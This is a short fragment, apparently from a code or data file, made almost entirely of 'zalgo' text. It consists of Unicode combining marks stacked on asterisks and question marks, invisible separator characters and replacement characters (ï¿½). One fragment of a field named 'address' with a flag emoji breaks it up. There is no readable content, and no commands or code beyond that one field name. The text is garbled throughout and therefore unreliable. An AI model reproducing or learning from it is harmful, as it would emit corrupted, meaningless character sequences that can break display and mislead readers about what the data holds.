̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̊͟*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊ ',
						address: '🇮🇩̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̛̹̜̟͍̤͚̺̳͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͝͡